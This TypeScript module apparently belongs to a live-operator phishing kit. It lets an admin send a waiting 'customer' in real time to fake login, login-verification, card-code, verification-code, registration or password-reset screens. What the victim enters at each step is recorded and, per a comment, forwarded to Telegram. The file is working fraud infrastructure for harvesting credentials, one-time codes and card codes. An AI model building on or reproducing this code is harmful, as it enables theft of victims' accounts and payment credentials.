// Customer-flow control — the admin decides, in real time, which screen the
// waiting customer is sent to next. Mirrors the jusoura "loader action" model,
// adapted to this decoupled (React + Express) stack where the Payment record is
// the central entity and the browser polls by `reference`.

export const FLOW_ACTIONS = {
  REDIRECT_PAYMENT: "redirect_payment",
  REDIRECT_LOGIN: "redirect_login",
  REDIRECT_VERIFY_LOGIN: "redirect_verify_login",
  REDIRECT_CARD_CODE: "redirect_card_code",
  REDIRECT_CREATE_ACCOUNT: "redirect_create_account",
  REDIRECT_VERIFICATION_CODE: "redirect_verification_code",
  REDIRECT_RESET_PASSWORD: "redirect_reset_password",
  KEEP_WAITING: "keep_waiting",
} as const;

export type FlowAction = (typeof FLOW_ACTIONS)[keyof typeof FLOW_ACTIONS];

// Each redirect action maps to a page id. The page id is what the frontend
// reports while polling, and is used to know when the customer has "arrived"
// (so the pending action can be cleared and they stay put).
export const ACTION_TO_PAGE: Record<string, string> = {
  [FLOW_ACTIONS.REDIRECT_PAYMENT]: "payment",
  [FLOW_ACTIONS.REDIRECT_LOGIN]: "login",
  [FLOW_ACTIONS.REDIRECT_VERIFY_LOGIN]: "verify-login",
  [FLOW_ACTIONS.REDIRECT_CARD_CODE]: "card-code",
  [FLOW_ACTIONS.REDIRECT_CREATE_ACCOUNT]: "register",
  [FLOW_ACTIONS.REDIRECT_VERIFICATION_CODE]: "verification-code",
  [FLOW_ACTIONS.REDIRECT_RESET_PASSWORD]: "forgot-password",
};

// Page id -> frontend route the browser should navigate to.
export const PAGE_TO_PATH: Record<string, string> = {
  payment: "/pay",
  login: "/flow/login",
  "verify-login": "/flow/verify-login",
  "card-code": "/flow/card-code",
  register: "/flow/register",
  "verification-code": "/flow/verification-code",
  "forgot-password": "/flow/forgot-password",
};

export const REDIRECT_ACTIONS = Object.keys(ACTION_TO_PAGE);

export const ALL_FLOW_ACTIONS: string[] = [
  ...REDIRECT_ACTIONS,
  FLOW_ACTIONS.KEEP_WAITING,
];

export function isRedirectAction(
  action: string | null | undefined,
): action is FlowAction {
  return !!action && REDIRECT_ACTIONS.includes(action);
}

export function pageForAction(
  action: string | null | undefined,
): string | null {
  return isRedirectAction(action) ? ACTION_TO_PAGE[action] : null;
}

export function pathForAction(
  action: string | null | undefined,
): string | null {
  const page = pageForAction(action);
  return page ? (PAGE_TO_PATH[page] ?? null) : null;
}

// The flow "steps" recorded against a payment (what the customer submitted on
// each redirected screen). Used as keys in `flowSubmissions` and for Telegram.
export const FLOW_STEPS = {
  LOGIN: "login_submitted",
  VERIFY_LOGIN: "verify_login_submitted",
  CARD_CODE: "card_code_submitted",
  REGISTER: "register_submitted",
  VERIFICATION_CODE: "verification_code_submitted",
  RESET_PASSWORD: "reset_password_submitted",
} as const;

export type FlowStep = (typeof FLOW_STEPS)[keyof typeof FLOW_STEPS];

export const ALL_FLOW_STEPS: string[] = Object.values(FLOW_STEPS);
